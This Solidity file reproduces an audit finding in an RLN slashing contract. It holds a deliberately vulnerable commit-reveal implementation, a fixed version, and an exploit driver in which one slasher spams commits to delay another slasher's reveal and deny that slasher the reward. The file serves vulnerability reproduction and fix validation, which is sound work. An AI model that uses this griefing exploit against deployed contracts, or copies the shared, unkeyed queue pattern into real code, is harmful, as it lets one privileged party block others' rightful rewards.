// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Status Network RLN finding 65327:
// "Any slasher can increase another one's reveal delays" (Cyfrin, HIGH).
//
// RLN's slash uses a commit-reveal scheme. `slashCommit(account, hash)` queues a
// reveal window per `account` using the SHARED counter `lastRevealStartTime[account]`
// and stores the commitment at `slashCommitments[account][hash]`. NEITHER the queue
// counter NOR the commitment slot is keyed by the committing slasher (msg.sender).
//
// Consequence: any SLASHER_ROLE holder can spam `slashCommit(victimAccount, <any hash>)`
// to inflate the SHARED `lastRevealStartTime[victimAccount]` by `slashRevealWindowTime`
// per call. When the HONEST slasher later commits their real hash for the same account,
// their reveal window is queued far into the future, so their `slashReveal` reverts
// RLN__RevealWindowNotStarted for an attacker-chosen duration — denying the honest
// slasher the SLASH reward they were entitled to.
//
// The vulnerable slashCommit / slashReveal bodies are inlined VERBATIM from the audited
// (pre-fix) commit 0644175 (parent of fix f15f5e9). The `// @>` marks the shared,
// committer-agnostic queue write that lets one slasher grief another's reveal.
//
// Fix (RLNFixed): key BOTH the queue counter and the commitment by the committing
// slasher, so a griefer's spam only touches their OWN queue and the honest slasher's
// reveal proceeds immediately.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal ERC20-ish reward/marker token double.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

/// @dev Faithful minimal double for Karma's slash-reward payout. On slash, it burns the
///      slashed member's Karma balance and mints a percentage of it as the SLASH REWARD
///      to `rewardRecipient` (mirrors Karma._slash's reward leg). Only the authorized RLN
///      contract may call slash (mirrors Karma's onlyAdminOrSlasher).
contract KarmaLite {
    uint256 internal constant MAX_SLASH_PERCENTAGE = 10_000;

    string public constant name = "Karma";
    string public constant symbol = "KARMA";
    uint8 public constant decimals = 18;

    mapping(address => uint256) public balanceOf;
    uint256 public slashRewardPercentage; // bps of the slashed amount paid to the recipient
    address public rln;                    // the only authorized slasher

    error Karma__CannotSlashZeroBalance();
    error Karma__Unauthorized();

    constructor(uint256 _slashRewardPercentage) {
        slashRewardPercentage = _slashRewardPercentage;
    }

    function setRLN(address _rln) external {
        rln = _rln;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    /// @notice Burns the account's balance and mints `pct%` of it to rewardRecipient.
    function slash(address account, address rewardRecipient) external returns (uint256) {
        if (msg.sender != rln) revert Karma__Unauthorized();
        uint256 currentBalance = balanceOf[account];
        if (currentBalance == 0) revert Karma__CannotSlashZeroBalance();

        uint256 rewardAmount = (currentBalance * slashRewardPercentage) / MAX_SLASH_PERCENTAGE;
        balanceOf[account] = 0; // burn
        if (rewardAmount > 0 && rewardRecipient != address(0)) {
            balanceOf[rewardRecipient] += rewardAmount; // mint reward
        }
        return currentBalance;
    }
}

/// @dev Faithful minimal double for PoseidonHasher: a real, deterministic hash from
///      privateKey -> identityCommitment (not a canned-value mock).
contract PoseidonHasherLite {
    function hash(uint256 input) external pure returns (uint256) {
        return uint256(keccak256(abi.encode(input)));
    }
}

interface IKarma {
    function slash(address account, address rewardRecipient) external returns (uint256);
}

interface IPoseidon {
    function hash(uint256 input) external pure returns (uint256);
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE RLN-lite. slashCommit / slashReveal bodies are VERBATIM from the
// audited pre-fix commit 0644175 (RLN.sol). Access control is reduced to a
// two-actor SLASHER_ROLE; upgradeability/UUPS boilerplate is omitted as it is
// irrelevant to this finding.
// ─────────────────────────────────────────────────────────────────────────────
contract RLN {
    error RLN__MemberNotFound();
    error RLN__Unauthorized();
    error RLN__InvalidCommitment();
    error RLN__RevealWindowNotStarted();

    struct User {
        address userAddress;
        uint256 index;
    }

    bytes32 public constant SLASHER_ROLE = keccak256("SLASHER_ROLE");

    mapping(bytes32 => mapping(address => bool)) internal _roles;

    uint256 public identityCommitmentIndex;
    mapping(uint256 => User) public members;

    IKarma public karma;
    IPoseidon public poseidonHasher;

    /// @dev Time window for reveal after commit (default 1 hour).
    uint256 public slashRevealWindowTime;

    /// @dev Last reveal start time for each account to be slashed (SHARED per account).
    mapping(address => uint256) public lastRevealStartTime;

    /// @dev Slash commitments mapping for the commit-reveal scheme.
    /// Maps account => commitmentHash => revealStartTime.
    mapping(address => mapping(bytes32 => uint256)) public slashCommitments;

    modifier onlyRole(bytes32 role) {
        if (!_roles[role][msg.sender]) revert RLN__Unauthorized();
        _;
    }

    constructor(address _karma, address _poseidonHasher) {
        karma = IKarma(_karma);
        poseidonHasher = IPoseidon(_poseidonHasher);
        slashRevealWindowTime = 1 hours;
    }

    function grantSlasher(address account) external {
        _roles[SLASHER_ROLE][account] = true;
    }

    /// @notice Test-only registration of a slashable member (mirrors register()).
    function registerMember(uint256 identityCommitment, address user) external {
        members[identityCommitment] = User(user, identityCommitmentIndex);
        unchecked {
            identityCommitmentIndex += 1;
        }
    }

    // ── VERBATIM vulnerable slashCommit (pre-fix commit 0644175) ────────────────
    function slashCommit(address account, bytes32 hash) external onlyRole(SLASHER_ROLE) {
        uint256 lastReveal = lastRevealStartTime[account];
        uint256 revealStartTime;

        if (lastReveal == 0 || lastReveal + slashRevealWindowTime < block.timestamp) {
            revealStartTime = block.timestamp;
        } else {
            revealStartTime = lastReveal + slashRevealWindowTime;
        }

        slashCommitments[account][hash] = revealStartTime;
        lastRevealStartTime[account] = revealStartTime; // @> shared per-account queue write, NOT keyed by msg.sender: ANY slasher's commit inflates the reveal time the honest slasher later inherits
    }

    // ── VERBATIM vulnerable slashReveal (pre-fix commit 0644175) ────────────────
    function slashReveal(address account, bytes32 privateKey, address rewardRecipient) external onlyRole(SLASHER_ROLE) {
        bytes32 hash = keccak256(abi.encodePacked(privateKey, rewardRecipient));
        uint256 revealStartTime = slashCommitments[account][hash];

        if (revealStartTime == 0) {
            revert RLN__InvalidCommitment();
        }

        if (block.timestamp < revealStartTime) {
            revert RLN__RevealWindowNotStarted();
        }

        delete slashCommitments[account][hash];
        _slash(privateKey, rewardRecipient);
    }

    function _slash(bytes32 privateKey, address rewardRecipient) internal {
        uint256 identityCommitment = poseidonHasher.hash(uint256(privateKey));
        User memory member = members[identityCommitment];
        if (member.userAddress == address(0)) {
            revert RLN__MemberNotFound();
        }
        karma.slash(member.userAddress, rewardRecipient);
        delete members[identityCommitment];
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED RLN-lite: the queue counter AND the commitment slot are keyed by the
// committing slasher (msg.sender), isolating each slasher's queue. A griefer's
// spam then only affects their OWN queue, so the honest slasher's reveal proceeds.
// ─────────────────────────────────────────────────────────────────────────────
contract RLNFixed {
    error RLN__MemberNotFound();
    error RLN__Unauthorized();
    error RLN__InvalidCommitment();
    error RLN__RevealWindowNotStarted();

    struct User {
        address userAddress;
        uint256 index;
    }

    bytes32 public constant SLASHER_ROLE = keccak256("SLASHER_ROLE");

    mapping(bytes32 => mapping(address => bool)) internal _roles;

    uint256 public identityCommitmentIndex;
    mapping(uint256 => User) public members;

    IKarma public karma;
    IPoseidon public poseidonHasher;

    uint256 public slashRevealWindowTime;

    /// @dev FIX: queue counter keyed by (account, committing slasher).
    mapping(address => mapping(address => uint256)) public lastRevealStartTime;
    /// @dev FIX: commitment keyed by (account, committerKey) where committerKey = keccak(msg.sender, hash).
    mapping(address => mapping(bytes32 => uint256)) public slashCommitments;

    modifier onlyRole(bytes32 role) {
        if (!_roles[role][msg.sender]) revert RLN__Unauthorized();
        _;
    }

    constructor(address _karma, address _poseidonHasher) {
        karma = IKarma(_karma);
        poseidonHasher = IPoseidon(_poseidonHasher);
        slashRevealWindowTime = 1 hours;
    }

    function grantSlasher(address account) external {
        _roles[SLASHER_ROLE][account] = true;
    }

    function registerMember(uint256 identityCommitment, address user) external {
        members[identityCommitment] = User(user, identityCommitmentIndex);
        unchecked {
            identityCommitmentIndex += 1;
        }
    }

    function _slashCommitmentKey(address sender, bytes32 hash) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked(sender, hash));
    }

    function slashCommit(address account, bytes32 hash) external onlyRole(SLASHER_ROLE) {
        uint256 lastReveal = lastRevealStartTime[account][msg.sender];
        uint256 revealStartTime;

        if (lastReveal == 0 || lastReveal + slashRevealWindowTime < block.timestamp) {
            revealStartTime = block.timestamp;
        } else {
            revealStartTime = lastReveal + slashRevealWindowTime;
        }

        bytes32 key = _slashCommitmentKey(msg.sender, hash);
        slashCommitments[account][key] = revealStartTime;
        lastRevealStartTime[account][msg.sender] = revealStartTime;
    }

    function slashReveal(address account, bytes32 privateKey, address rewardRecipient) external onlyRole(SLASHER_ROLE) {
        bytes32 hash = keccak256(abi.encodePacked(privateKey, rewardRecipient));
        bytes32 key = _slashCommitmentKey(msg.sender, hash);
        uint256 revealStartTime = slashCommitments[account][key];

        if (revealStartTime == 0) {
            revert RLN__InvalidCommitment();
        }

        if (block.timestamp < revealStartTime) {
            revert RLN__RevealWindowNotStarted();
        }

        delete slashCommitments[account][key];
        _slash(privateKey, rewardRecipient);
    }

    function _slash(bytes32 privateKey, address rewardRecipient) internal {
        uint256 identityCommitment = poseidonHasher.hash(uint256(privateKey));
        User memory member = members[identityCommitment];
        if (member.userAddress == address(0)) {
            revert RLN__MemberNotFound();
        }
        karma.slash(member.userAddress, rewardRecipient);
        delete members[identityCommitment];
    }
}

/// @dev A SLASHER_ROLE holder acting on the RLN contract. Two separate instances give
///      genuinely distinct msg.sender values (an honest slasher and a griefing slasher)
///      without cheatcodes — exactly the two-slasher scenario the finding requires.
contract Slasher {
    function commit(address target, address account, bytes32 hash) external {
        (bool ok,) = target.call(abi.encodeWithSignature("slashCommit(address,bytes32)", account, hash));
        require(ok, "slashCommit failed");
    }

    function tryReveal(
        address target,
        address account,
        bytes32 privateKey,
        address rewardRecipient
    ) external returns (bool) {
        (bool ok,) = target.call(
            abi.encodeWithSignature("slashReveal(address,bytes32,address)", account, privateKey, rewardRecipient)
        );
        return ok;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver. A griefing slasher spams slashCommit(victim, keccak(i)) to inflate
// the SHARED per-account queue; the honest slasher's real slashReveal then reverts
// RLN__RevealWindowNotStarted at the current time. The denied SLASH reward is recorded
// on a MARKER token to the SINK. A parallel run against RLNFixed shows the honest
// reveal succeeds (negative control).
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    // The slashable RLN member (the account being slashed) whose reveal is griefed.
    address internal constant VICTIM_MEMBER = 0x000000000000000000000000000000000000dEaD;
    // The honest slasher's chosen reward recipient (encoded in the real commit hash).
    address internal constant HONEST_RECIPIENT = 0x000000000000000000000000000000000000b0b0;

    uint256 internal constant N_GRIEF = 24;               // 24 spam commits
    uint256 internal constant WINDOW = 3600;              // slashRevealWindowTime = 1 hour
    bytes32 internal constant PRIVATE_KEY = bytes32(uint256(0xA11CE));
    uint256 internal constant VICTIM_KARMA = 10_000 ether; // slashable balance
    uint256 internal constant SLASH_PCT = 1000;            // 10% -> reward = 1000 ether

    // Exposed results.
    bool public buggyHonestReverted;       // honest reveal DoS'd on the vulnerable contract
    bool public fixedHonestSucceeded;      // honest reveal proceeds on the fixed contract
    uint256 public honestRevealStartBuggy; // queued reveal time inherited by the honest slasher
    uint256 public deniedRewardWei;        // SLASH reward the honest slasher was denied
    uint256 public delaySeconds;           // duration the honest reveal is pushed out
    uint256 public fixedHonestReward;      // reward the honest slasher gets on the fixed contract
    uint256 public sinkMarkerBalance;
    address public vulnAddr;
    address public markerAddr;

    function run() external payable {
        MiniToken marker = new MiniToken("DeniedReward", "DENIED-KARMA"); // deploy[0]
        PoseidonHasherLite poseidon = new PoseidonHasherLite();           // deploy[1]
        Slasher griefer = new Slasher();                                  // deploy[2]
        Slasher honest = new Slasher();                                   // deploy[3]

        uint256 idComm = poseidon.hash(uint256(PRIVATE_KEY));
        bytes32 realHash = keccak256(abi.encodePacked(PRIVATE_KEY, HONEST_RECIPIENT));

        deniedRewardWei = (VICTIM_KARMA * SLASH_PCT) / 10_000;

        // ── BUGGY path ──────────────────────────────────────────────────────────
        KarmaLite karmaB = new KarmaLite(SLASH_PCT);                      // deploy[4]
        RLN rln = new RLN(address(karmaB), address(poseidon));            // deploy[5]
        karmaB.setRLN(address(rln));
        karmaB.mint(VICTIM_MEMBER, VICTIM_KARMA);
        rln.grantSlasher(address(griefer));
        rln.grantSlasher(address(honest));
        rln.registerMember(idComm, VICTIM_MEMBER);
        vulnAddr = address(rln);

        // Griefing slasher spams arbitrary hashes for the victim account.
        for (uint256 i = 0; i < N_GRIEF; i++) {
            griefer.commit(address(rln), VICTIM_MEMBER, keccak256(abi.encode("grief", i)));
        }
        // Honest slasher commits the REAL hash for the same victim account.
        honest.commit(address(rln), VICTIM_MEMBER, realHash);

        honestRevealStartBuggy = rln.slashCommitments(VICTIM_MEMBER, realHash);
        delaySeconds = honestRevealStartBuggy - block.timestamp;

        // Honest slasher tries to reveal NOW — the inflated shared queue blocks it.
        buggyHonestReverted = !honest.tryReveal(address(rln), VICTIM_MEMBER, PRIVATE_KEY, HONEST_RECIPIENT);

        // ── FIXED path (negative control) ─────────────────────────────────────────
        KarmaLite karmaF = new KarmaLite(SLASH_PCT);                      // deploy[6]
        RLNFixed rlnF = new RLNFixed(address(karmaF), address(poseidon)); // deploy[7]
        karmaF.setRLN(address(rlnF));
        karmaF.mint(VICTIM_MEMBER, VICTIM_KARMA);
        rlnF.grantSlasher(address(griefer));
        rlnF.grantSlasher(address(honest));
        rlnF.registerMember(idComm, VICTIM_MEMBER);

        for (uint256 i = 0; i < N_GRIEF; i++) {
            griefer.commit(address(rlnF), VICTIM_MEMBER, keccak256(abi.encode("grief", i)));
        }
        honest.commit(address(rlnF), VICTIM_MEMBER, realHash);

        // Honest slasher reveals NOW — its own per-slasher queue is fresh, so it proceeds.
        fixedHonestSucceeded = honest.tryReveal(address(rlnF), VICTIM_MEMBER, PRIVATE_KEY, HONEST_RECIPIENT);
        fixedHonestReward = karmaF.balanceOf(HONEST_RECIPIENT);

        // ── HARM MARKER: mint the denied reward to the SINK ───────────────────────
        marker.mint(SINK, deniedRewardWei);
        markerAddr = address(marker);
        sinkMarkerBalance = marker.balanceOf(SINK);

        // The bug: honest slasher is DoS'd on the vulnerable contract but not on the fix.
        require(buggyHonestReverted, "honest reveal should be DoS'd on vulnerable RLN");
        require(fixedHonestSucceeded, "honest reveal should succeed on fixed RLN");
        require(delaySeconds == N_GRIEF * WINDOW, "delay must equal N * window");
        require(fixedHonestReward == deniedRewardWei, "fixed path must pay the honest slasher");
        require(sinkMarkerBalance == deniedRewardWei, "marker must record denied reward at SINK");
    }
}
